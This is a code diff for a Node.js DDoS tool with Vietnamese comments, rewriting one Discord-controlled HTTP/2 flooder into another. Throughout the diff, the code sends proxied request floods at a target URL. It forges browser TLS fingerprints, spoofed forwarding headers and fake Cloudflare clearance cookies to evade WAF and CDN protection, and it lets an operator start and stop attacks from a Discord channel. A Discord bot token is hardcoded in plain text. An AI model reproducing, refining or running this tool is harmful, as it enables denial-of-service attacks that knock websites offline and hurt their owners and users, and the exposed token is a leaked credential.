@@ -1,17 +1,31 @@
 // ==++==
-// HTTPV8-WAF-BYPASS.js - Flood Control via Discord
-// Bypass WAF + CF + Anti-Detect
+// v1.74-DISCORD.js - GIỮ NGUYÊN CODE GỐC + DISCORD
+// Chạy: node v1.74-DISCORD.js
 // ==++==
 
-process.on('uncaughtException', () => {});
-process.on('unhandledRejection', () => {});
+process.on('uncaughtException', function(er) {});
+process.on('unhandledRejection', function(er) {});
+process.on("SIGHUP", () => 1);
+process.on("SIGCHILD", () => 1);
 
-// ==================== DISCORD CONFIG ====================
+require("events").EventEmitter.defaultMaxListeners = 0;
+process.setMaxListeners(0);
+
+// ==================== THÊM DISCORD ====================
+const { Client, GatewayIntentBits } = require('discord.js');
+const discordClient = new Client({ 
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.MessageContent
+    ] 
+});
+
+// CONFIG DISCORD - THAY CÁI NÀY
 const TOKEN = 'MTQ1Njk2NDc5NDIxMjE1OTcwMg.GEvb_q.UIxdf1LtmKM8S46VrCp6tFowBWj-j8SW181dFA';
 const CHANNEL_ID = '1456595444477198508';
+// ====================================================
 
-// ==================== THƯ VIỆN ====================
-const { Client, GatewayIntentBits } = require('discord.js');
 const cluster = require("cluster");
 const crypto = require("crypto");
 const http2 = require("http2");
@@ -19,433 +33,454 @@ const net = require("net");
 const tls = require("tls");
 const url = require("url");
 const fs = require("fs");
-const axios = require('axios');
+const path = require("path");
 
-// ==================== KIỂM TRA ====================
-if (TOKEN === 'YOUR_BOT_TOKEN_HERE') {
-    console.log('\x1b[31m❌ LỖI: Bạn chưa thay token bot!\x1b[0m');
-    process.exit(1);
+var fileName = __filename;
+var colors = require("colors");
+var file = path.basename(fileName);
+
+// ==================== CODE GỐC v1.74 HOÀN TOÀN GIỮ NGUYÊN ====================
+if (process.argv.length < 7) {
+    console.log('node v1.74.js <url> <time> <requests> <threads> <proxy>'.rainbow);
+    process.exit();
 }
 
-// ==================== PROXY MANAGER ====================
-let proxyList = [];
-let proxyIndex = 0;
+const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+const ciphers = "GREASE:" + [
+    defaultCiphers[2],
+    defaultCiphers[1],
+    defaultCiphers[0],
+    ...defaultCiphers.slice(3)
+].join(":");
 
-async function loadProxies() {
-    try {
-        if (fs.existsSync('./proxy.txt')) {
-            proxyList = fs.readFileSync('./proxy.txt', 'utf-8')
-                .split('\n')
-                .filter(line => line.includes(':'));
-            console.log(`\x1b[32m[+] Loaded ${proxyList.length} proxies from file\x1b[0m`);
-        } else {
-            // Tự động tải proxy từ nhiều nguồn
-            const sources = [
-                'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
-                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
-                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
-                'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt'
-            ];
-            
-            for (const src of sources) {
-                try {
-                    const res = await axios.get(src, { timeout: 5000 });
-                    const proxies = res.data.split('\n').filter(line => line.includes(':'));
-                    proxyList.push(...proxies);
-                } catch (e) {}
-            }
-            
-            proxyList = [...new Set(proxyList)];
-            fs.writeFileSync('./proxy.txt', proxyList.join('\n'));
-            console.log(`\x1b[32m[+] Downloaded ${proxyList.length} proxies\x1b[0m`);
-        }
-        
-        // Thêm direct connection
-        proxyList.push('direct');
-    } catch (e) {
-        proxyList = ['direct'];
+const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
+const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
+
+const secureOptions =
+    crypto.constants.SSL_OP_NO_SSLv2 |
+    crypto.constants.SSL_OP_NO_SSLv3 |
+    crypto.constants.SSL_OP_NO_TLSv1 |
+    crypto.constants.SSL_OP_NO_TLSv1_1 |
+    crypto.constants.ALPN_ENABLED |
+    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
+    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
+    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
+    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
+    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
+    crypto.constants.SSL_OP_SINGLE_DH_USE |
+    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
+    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
+
+const secureProtocol = "TLS_client_method";
+
+const secureContext = tls.createSecureContext({
+    ciphers: ciphers,
+    sigalgs: sigalgs,
+    honorCipherOrder: true,
+    secureOptions: secureOptions,
+    secureProtocol: secureProtocol
+});
+
+const headers = {};
+
+function readLines(filePath) {
+    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() && line.includes(':'));
+}
+
+function randomIntn(min, max) {
+    return Math.floor(Math.random() * (max - min) + min);
+}
+
+function randomElement(elements) {
+    return elements[randomIntn(0, elements.length)];
+}
+
+function randomCharacters(length) {
+    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let output = "";
+    for (let count = 0; count < length; count++) {
+        output += chars[Math.floor(Math.random() * chars.length)];
     }
+    return output;
 }
 
-// ==================== TLS FINGERPRINT ROTATION ====================
-const cipherSuites = [
-    // Chrome 120+
-    "GREASE:ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM",
-    // Firefox 120+
-    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384",
-    // Safari
-    "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305"
-];
+const args = {
+    target: process.argv[2],
+    time: process.argv[3],
+    rate: process.argv[4],
+    threads: process.argv[5],
+    proxy: process.argv[6],
+    cookie: process.argv[7] || undefined
+};
 
-const sigalgsList = [
-    "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
-    "rsa_pkcs1_sha256:ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256"
-];
-
-const curvesList = [
-    "X25519:secp256r1:secp384r1",
-    "X25519Kyber:secp256r1:secp384r1",
-    "secp256r1:secp384r1:X25519"
-];
-
-function getRandomTLS() {
-    return {
-        ciphers: cipherSuites[Math.floor(Math.random() * cipherSuites.length)],
-        sigalgs: sigalgsList[Math.floor(Math.random() * sigalgsList.length)],
-        ecdhCurve: curvesList[Math.floor(Math.random() * curvesList.length)],
-        honorCipherOrder: true
-    };
-}
-
-// ==================== RANDOM ====================
-function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
-function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
-function randomString(len) { return crypto.randomBytes(len).toString('hex').slice(0, len); }
-function randomIP() { return `${randomInt(1,255)}.${randomInt(0,255)}.${randomInt(0,255)}.${randomInt(1,255)}`; }
-
-// ==================== USER-AGENTS KHỦNG ====================
-const uas = [
-    // Chrome Windows
-    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
-    // Chrome Mac
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
-    // Firefox
-    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15.4; rv:140.0) Gecko/20100101 Firefox/140.0',
-    // Safari
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/605.1.15 Version/20.0 Safari/605.1.15',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile/15E148 Safari/604.1',
-    // Edge
-    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0',
-    // Opera
-    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36 OPR/130.0.0.0'
-];
-
-// ==================== HEADER LISTS ĐA DẠNG ====================
+// ==================== HEADER LISTS ====================
 const accept_header = [
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-    'application/json, text/plain, */*',
-    'text/css,*/*;q=0.1',
-    'image/avif,image/webp,image/apng,image/*,*/*;q=0.8'
+    '*/*',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
+    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
+];
+
+const cache_header = [
+    'no-cache',
+    'no-store',
+    'no-transform',
+    'only-if-cached',
+    'max-age=0',
+    'must-revalidate',
+    'public',
+    'private',
+    'proxy-revalidate'
+];
+
+const lang_header = [
+    'en-US,en;q=0.9',
+    'vi-VN,vi;q=0.9,en-US;q=0.8',
+    'fr-FR,fr;q=0.9,en;q=0.8',
+    'ja-JP,ja;q=0.9,en;q=0.8',
+    'zh-CN,zh;q=0.9,en;q=0.8'
+];
+
+const platform = [
+    "Windows",
+    "Macintosh",
+    "Linux",
+    "iOS",
+    "Android",
+    "iPhone",
+    "iPad"
+];
+
+const dest_header = [
+    'document',
+    'empty',
+    'iframe',
+    'image',
+    'script'
+];
+
+const mode_header = [
+    'navigate',
+    'cors',
+    'no-cors',
+    'same-origin'
+];
+
+const site_header = [
+    'cross-site',
+    'same-origin',
+    'same-site',
+    'none'
 ];
 
 const encoding_header = [
-    'gzip, deflate, br, zstd',
     'gzip, deflate, br',
     'gzip, deflate',
     'br, gzip, deflate'
 ];
 
-const lang_header = [
-    'en-US,en;q=0.9,vi;q=0.8',
-    'vi-VN,vi;q=0.9,en-US;q=0.8',
-    'fr-FR,fr;q=0.9,en;q=0.8',
-    'ja-JP,ja;q=0.9,en;q=0.8',
-    'zh-CN,zh;q=0.9,en;q=0.8',
-    'ru-RU,ru;q=0.9,en;q=0.8'
+const uap = [
+    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile/15E148 Safari/604.1'
 ];
 
-const cache_header = [
-    'no-cache',
-    'max-age=0',
-    'no-store',
-    'private, no-cache, no-store, must-revalidate',
-    'max-age=0, must-revalidate'
-];
-
-const referers = [
-    'https://www.google.com/',
-    'https://www.google.com/search?q=',
-    'https://www.facebook.com/',
-    'https://www.youtube.com/',
-    'https://www.bing.com/',
-    'https://www.instagram.com/',
-    'https://www.tiktok.com/',
-    'https://twitter.com/',
-    'https://www.reddit.com/',
-    'https://www.amazon.com/',
-    'https://github.com/',
-    'https://stackoverflow.com/'
-];
-
-const platforms = ["Windows", "macOS", "Linux", "Android", "iOS"];
-const dests = ['document', 'empty', 'iframe', 'image', 'script'];
-const modes = ['navigate', 'cors', 'no-cors'];
-const sites = ['cross-site', 'same-origin', 'same-site', 'none'];
-
-// ==================== COOKIE GENERATOR ====================
-function generateCookie() {
-    const cookies = [];
-    cookies.push(`_ga=GA1.2.${randomInt(1e8,1e9)}.${Date.now()}`);
-    cookies.push(`_gid=GA1.2.${randomInt(1e8,1e9)}.${Date.now()}`);
-    cookies.push(`session=${randomString(32)}`);
-    cookies.push(`cf_clearance=${randomString(40)}`);
-    return cookies.join('; ');
-}
+var proxies = readLines(args.proxy);
+const parsedTarget = url.parse(args.target);
 
 // ==================== CLASS NetSocket ====================
 class NetSocket {
+    constructor() {}
+
     HTTP(options, callback) {
-        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
-        const conn = net.connect(options.port, options.host, () => conn.write(payload));
-        conn.setTimeout(3000);
-        conn.on('data', d => d.toString().includes('200') ? callback(conn) : conn.destroy());
-        conn.on('error', () => callback(null));
-        conn.on('timeout', () => conn.destroy());
+        const parsedAddr = options.address.split(":");
+        const addrHost = parsedAddr[0];
+        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
+        const buffer = Buffer.from(payload);
+        const connection = net.connect({
+            host: options.host,
+            port: options.port,
+            allowHalfOpen: true,
+            writable: true,
+            readable: true
+        });
+
+        connection.setTimeout(options.timeout * 20000);
+        connection.setKeepAlive(true, 20000);
+        connection.setNoDelay(true);
+        
+        connection.on("connect", () => {
+            connection.write(buffer);
+        });
+
+        connection.on("data", chunk => {
+            const response = chunk.toString("utf-8");
+            const isAlive = response.includes("HTTP/1.1 200");
+            if (isAlive === false) {
+                connection.destroy();
+                return callback(undefined, "403");
+            }
+            return callback(connection, undefined);
+        });
+
+        connection.on("timeout", () => {
+            connection.destroy();
+            return callback(undefined, "403");
+        });
+
+        connection.on("error", error => {
+            connection.destroy();
+            return callback(undefined, "403");
+        });
     }
 }
 
-// ==================== WORKER FLOOD ====================
-function createWorker(target, rate) {
-    const parsed = url.parse(target);
-    const Socker = new NetSocket();
-    let count = 0;
+// ==================== CLUSTER ====================
+if (cluster.isMaster) {
+    console.clear();
+    console.log("⚡ v1.74 DISCORD EDITION".rainbow);
+    console.log(`Target: ${args.target}`.green);
+    console.log(`Time: ${args.time}s`.green);
+    console.log(`Rate: ${args.rate}`.green);
+    console.log(`Threads: ${args.threads}`.green);
+    console.log(`Proxy: ${args.proxy} (${proxies.length} proxies)`.green);
+    console.log("ATTACK STARTED".bgRed);
     
+    for (let counter = 1; counter <= args.threads; counter++) {
+        cluster.fork();
+    }
+    
+    let stats = { total: 0 };
+    const startTime = Date.now();
+
+    cluster.on('message', (worker, msg) => {
+        if (msg && msg.type === 'stats') {
+            stats.total += msg.count || 0;
+        }
+    });
+
+    // Stats hiển thị trên console
     setInterval(() => {
-        if (count > 0 && process.send) process.send(count);
-        count = 0;
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        const rps = Math.floor(stats.total / (elapsed || 1));
+        
+        console.clear();
+        console.log("⚡ v1.74 DISCORD EDITION".rainbow);
+        console.log(`Time: ${elapsed}s / ${args.time}s`.yellow);
+        console.log(`Requests: ${stats.total.toLocaleString()}`.cyan);
+        console.log(`RPS: ${rps}`.magenta);
+        console.log(`Workers: ${Object.keys(cluster.workers).length}`.green);
+        console.log("ATTACKING".bgRed);
+        
+        stats.total = 0;
     }, 1000);
     
-    function flood() {
-        const proxy = randomElement(proxyList);
-        if (proxy === 'direct') return setTimeout(flood, 100);
+    // ==================== DISCORD BOT ====================
+    let attackActive = true;
+    
+    discordClient.once('ready', () => {
+        console.log(`\x1b[32m[+] Discord Bot ${discordClient.user.tag} ready!\x1b[0m`);
+        const channel = discordClient.channels.cache.get(CHANNEL_ID);
+        if (channel) {
+            channel.send(`
+⚔️ **v1.74 DISCORD EDITION** ⚔️
+Target: ${args.target}
+Time: ${args.time}s
+Rate: ${args.rate}
+Threads: ${args.threads}
+Proxy: ${proxies.length}
+Status: 🔥 ATTACKING
+            `);
+        }
+    });
+
+    discordClient.on('messageCreate', (message) => {
+        if (message.channel.id !== CHANNEL_ID) return;
         
-        const [ph, pp] = proxy.split(':');
+        if (message.content === '!stop') {
+            attackActive = false;
+            process.exit(0);
+        }
         
-        // Tạo TLS config mới mỗi request
-        const tlsConfig = getRandomTLS();
-        const secureContext = tls.createSecureContext(tlsConfig);
+        if (message.content === '!status') {
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            const rps = Math.floor(stats.total / (elapsed || 1));
+            message.channel.send(`
+📊 **STATUS**
+Time: ${elapsed}s / ${args.time}s
+Requests: ${stats.total.toLocaleString()}
+RPS: ${rps}
+Workers: ${Object.keys(cluster.workers).length}
+Proxy: ${proxies.length}
+            `);
+        }
+    });
+
+    discordClient.login(TOKEN).catch(err => {
+        console.log(`\x1b[31m[!] Discord login failed: ${err.message}\x1b[0m`);
+    });
+
+    setTimeout(() => {
+        attackActive = false;
+        console.log("\nAttack finished".green);
+        const channel = discordClient.channels.cache.get(CHANNEL_ID);
+        if (channel) {
+            channel.send(`✅ **ATTACK FINISHED** - Total requests: ${stats.total.toLocaleString()}`);
+        }
+        process.exit(0);
+    }, args.time * 1000);
+    
+} else {
+    // Worker
+    let count = 0;
+    setInterval(() => {
+        process.send({ type: 'stats', count });
+        count = 0;
+    }, 1000);
+
+    function runFlooder() {
+        const proxyAddr = randomElement(proxies);
+        if (!proxyAddr) {
+            setTimeout(runFlooder, 1000);
+            return;
+        }
         
-        // Tạo headers đa dạng
-        const ua = randomElement(uas);
-        const isMobile = /iPhone|Android/i.test(ua) ? '?1' : '?0';
+        const parsedProxy = proxyAddr.split(":");
         
+        const uas = randomElement(uap);
         const headers = {
-            ':method': 'GET',
-            ':path': parsed.path + '?' + randomString(randomInt(4,12)),
-            ':authority': parsed.host,
-            'user-agent': ua,
-            'accept': randomElement(accept_header),
-            'accept-encoding': randomElement(encoding_header),
-            'accept-language': randomElement(lang_header),
-            'cache-control': randomElement(cache_header),
-            'pragma': randomElement(['no-cache', '']),
-            'referer': randomElement(referers),
-            'sec-ch-ua': `"Chromium";v="150", "Google Chrome";v="150", "Not?A_Brand";v="99"`,
-            'sec-ch-ua-mobile': isMobile,
-            'sec-ch-ua-platform': `"${randomElement(platforms)}"`,
-            'sec-fetch-dest': randomElement(dests),
-            'sec-fetch-mode': randomElement(modes),
-            'sec-fetch-site': randomElement(sites),
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'x-forwarded-for': randomIP(),
-            'x-real-ip': randomIP(),
-            'x-forwarded-proto': 'https',
-            'cookie': generateCookie(),
-            'dnt': randomElement(['1', '0']),
-            'priority': randomElement(['u=0, i', 'u=0']),
-            'viewport-width': randomInt(1280, 3840).toString(),
-            'viewport-height': randomInt(720, 2160).toString(),
-            'device-memory': randomElement(['4', '8', '16'])
+            ":method": "GET",
+            ":path": parsedTarget.path + '?' + randomCharacters(8),
+            ":authority": parsedTarget.host,
+            "accept": randomElement(accept_header),
+            "accept-encoding": randomElement(encoding_header),
+            "accept-language": randomElement(lang_header),
+            "cache-control": randomElement(cache_header),
+            "pragma": "no-cache",
+            "cookie": args.cookie || `cf_clearance=${randomCharacters(40)}; _ga=${randomCharacters(20)}`,
+            "sec-ch-ua": `"Chromium";v="150", "Google Chrome";v="150", "Not?A_Brand";v="99"`,
+            "cf-cache-status": "DYNAMIC",
+            "referer": "https://www.google.com/",
+            "priority": "u=0, 1",
+            "origin": parsedTarget.host,
+            "cdn-loop": "cloudflare",
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": randomElement(platform),
+            "sec-fetch-dest": randomElement(dest_header),
+            "sec-fetch-mode": randomElement(mode_header),
+            "sec-fetch-site": randomElement(site_header),
+            "sec-fetch-user": "1",
+            "upgrade-insecure-requests": "1",
+            "user-agent": uas,
+            "x-requested-with": "XMLHttpRequest",
+            "x-forwarded-for": parsedProxy[0],
+            "x-forwarded-proto": "https"
         };
 
-        Socker.HTTP({ host: ph, port: parseInt(pp), address: parsed.host + ':443' }, (conn) => {
-            if (!conn) return;
-            
-            const tlsConn = tls.connect({
-                socket: conn,
-                servername: parsed.host,
+        const Socker = new NetSocket();
+        const proxyOptions = {
+            host: parsedProxy[0],
+            port: parseInt(parsedProxy[1]),
+            address: parsedTarget.host + ":443",
+            timeout: 100
+        };
+
+        Socker.HTTP(proxyOptions, (connection, error) => {
+            if (error || !connection) return;
+
+            connection.setKeepAlive(true, 90000);
+            connection.setNoDelay(true);
+
+            const tlsOptions = {
+                port: 443,
+                ALPNProtocols: ["h2", "http/1.1"],
+                secure: true,
+                ciphers: ciphers,
+                sigalgs: sigalgs,
+                requestCert: true,
+                socket: connection,
+                ecdhCurve: ecdhCurve,
+                honorCipherOrder: false,
                 rejectUnauthorized: false,
-                secureContext: secureContext
-            });
-            
-            const client = http2.connect(parsed.href, { 
-                createConnection: () => tlsConn,
-                settings: { maxConcurrentStreams: 2000 }
-            });
-            
-            client.on('connect', () => {
-                for (let i = 0; i < rate; i++) {
-                    try {
-                        const req = client.request(headers);
-                        req.on('error', () => {});
-                        req.end();
-                        count++;
-                    } catch (e) {}
-                }
-                setTimeout(() => client.close(), 50);
-            });
-            
-            client.on('error', () => {});
-        });
-        
-        setImmediate(flood);
-    }
-    
-    flood();
-}
+                host: parsedTarget.host,
+                servername: parsedTarget.host,
+                secureOptions: secureOptions,
+                secureContext: secureContext,
+                secureProtocol: secureProtocol
+            };
 
-// ==================== DISCORD BOT ====================
-const client = new Client({ 
-    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] 
-});
+            try {
+                const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
 
-let currentAttack = null;
-let workers = [];
-let totalReqs = 0;
-let startTime = 0;
+                tlsConn.allowHalfOpen = true;
+                tlsConn.setNoDelay(true);
+                tlsConn.setKeepAlive(true, 60 * 100000);
+                tlsConn.setMaxListeners(0);
 
-client.once('ready', () => {
-    console.log(`\x1b[32m[+] Bot ${client.user.tag} đã sẵn sàng!\x1b[0m`);
-    const channel = client.channels.cache.get(CHANNEL_ID);
-    if (channel) {
-        channel.send(`
-╔══════════════════════════════════════════════════════╗
-║     HTTPV8 - WAF BYPASS ENGINE - READY              ║
-╠══════════════════════════════════════════════════════╣
-║  !flood <url> <time> <rate> <threads>               ║
-║  !stop                                               ║
-║  !status                                             ║
-║  !proxy                                              ║
-║  !help                                               ║
-╚══════════════════════════════════════════════════════╝
-        `);
-    }
-});
+                const client = http2.connect(parsedTarget.href, {
+                    protocol: "https:",
+                    settings: {
+                        headerTableSize: 65536,
+                        maxConcurrentStreams: 1000,
+                        initialWindowSize: 6291456,
+                        maxHeaderListSize: 262144,
+                        enablePush: false
+                    },
+                    maxSessionMemory: 3333,
+                    maxDeflateDynamicTableSize: 4294967295,
+                    createConnection: () => tlsConn
+                });
 
-client.on('messageCreate', async (msg) => {
-    if (msg.channel.id !== CHANNEL_ID || !msg.content.startsWith('!')) return;
-    
-    const args = msg.content.slice(1).split(' ');
-    const cmd = args[0].toLowerCase();
-    
-    if (cmd === 'help') {
-        msg.channel.send(`
-**📚 LỆNH:**
-\`!flood <url> <time> <rate> <threads>\` - VD: \`!flood https://example.com 300 1000 50\`
-\`!stop\` - Dừng tấn công
-\`!status\` - Xem trạng thái
-\`!proxy\` - Xem số proxy
-\`!help\` - Hướng dẫn
+                client.settings({
+                    headerTableSize: 65536,
+                    maxConcurrentStreams: 1000,
+                    initialWindowSize: 6291456,
+                    maxHeaderListSize: 262144,
+                    enablePush: false
+                });
 
-**⚡ TỐI ƯU:**
-- Rate càng cao càng mạnh (500-5000)
-- Threads = CPU cores * 10
-- Proxy càng nhiều càng tốt
-        `);
-    }
-    
-    else if (cmd === 'proxy') {
-        msg.channel.send(`📡 **PROXY**: ${proxyList.length} proxies available`);
-    }
-    
-    else if (cmd === 'flood') {
-        if (args.length < 5) return msg.channel.send('❌ Thiếu tham số! VD: !flood https://example.com 300 1000 50');
-        
-        const target = args[1];
-        const time = parseInt(args[2]);
-        const rate = parseInt(args[3]);
-        const threads = parseInt(args[4]);
-        
-        if (!target.startsWith('http')) return msg.channel.send('❌ URL phải bắt đầu bằng http');
-        if (isNaN(time) || time < 10) return msg.channel.send('❌ Thời gian phải >= 10');
-        if (isNaN(rate) || rate < 10) return msg.channel.send('❌ Rate phải >= 10');
-        if (isNaN(threads) || threads < 1) return msg.channel.send('❌ Threads phải >= 1');
-        
-        // Dừng attack cũ
-        if (currentAttack) {
-            workers.forEach(w => w.kill());
-            workers = [];
-        }
-        
-        msg.channel.send(`
-🔥 **BẮT ĐẦU TẤN CÔNG**
-Target: ${target}
-Time: ${time}s
-Rate: ${rate}
-Threads: ${threads}
-Proxy: ${proxyList.length}
-Mode: WAF BYPASS ENABLED
-        `);
-        
-        // Fork workers
-        if (cluster.isMaster) {
-            for (let i = 0; i < threads; i++) {
-                const worker = cluster.fork();
-                worker.send({ target, rate });
-                workers.push(worker);
+                client.setMaxListeners(0);
+
+                client.on("connect", () => {
+                    function sendBatch() {
+                        for (let i = 0; i < args.rate; i++) {
+                            try {
+                                const request = client.request(headers);
+                                request.on("response", () => {
+                                    request.close();
+                                    request.destroy();
+                                });
+                                request.on("error", () => {});
+                                request.end();
+                                count++;
+                            } catch (e) {}
+                        }
+                        setImmediate(sendBatch);
+                    }
+                    sendBatch();
+                });
+
+                client.on("close", () => {
+                    client.destroy();
+                    connection.destroy();
+                });
+
+                client.on("error", () => {
+                    client.destroy();
+                    connection.destroy();
+                });
+
+            } catch (e) {
+                connection.destroy();
             }
-            
-            currentAttack = { target, time, start: Date.now() };
-            totalReqs = 0;
-            startTime = Date.now();
-            
-            cluster.on('message', (w, cnt) => totalReqs += cnt);
-            
-            setTimeout(() => {
-                if (currentAttack) {
-                    workers.forEach(w => w.kill());
-                    workers = [];
-                    currentAttack = null;
-                    const elapsed = Math.floor((Date.now() - startTime) / 1000);
-                    msg.channel.send(`
-✅ **KẾT THÚC TẤN CÔNG**
-Thời gian: ${elapsed}s
-Tổng requests: ${totalReqs.toLocaleString()}
-RPS trung bình: ${Math.floor(totalReqs / elapsed)}
-                    `);
-                }
-            }, time * 1000);
-        }
-    }
-    
-    else if (cmd === 'stop') {
-        if (currentAttack) {
-            workers.forEach(w => w.kill());
-            workers = [];
-            currentAttack = null;
-            msg.channel.send('🛑 **ĐÃ DỪNG TẤN CÔNG**');
-        } else {
-            msg.channel.send('⚠️ Không có attack nào');
-        }
-    }
-    
-    else if (cmd === 'status') {
-        if (currentAttack) {
-            const elapsed = Math.floor((Date.now() - currentAttack.start) / 1000);
-            const rps = Math.floor(totalReqs / (elapsed || 1));
-            msg.channel.send(`
-📊 **TRẠNG THÁI**
-Target: ${currentAttack.target}
-Thời gian: ${elapsed}s / ${currentAttack.time}s
-Requests: ${totalReqs.toLocaleString()}
-RPS: ${rps.toLocaleString()}
-Workers: ${workers.length}
-Proxy: ${proxyList.length}
-            `);
-        } else {
-            msg.channel.send('📴 Không có attack nào');
-        }
-    }
-});
-
-// ==================== MAIN ====================
-async function main() {
-    await loadProxies();
-    
-    if (cluster.isMaster) {
-        client.login(TOKEN).catch(err => {
-            console.log('\x1b[31m❌ LỖI LOGIN DISCORD:\x1b[0m', err.message);
-            process.exit(1);
         });
-    } else {
-        process.on('message', (data) => createWorker(data.target, data.rate));
     }
-}
 
-main();
+    for (let i = 0; i < 5; i++) {
+        setTimeout(runFlooder, i * 100);
+    }
+    }
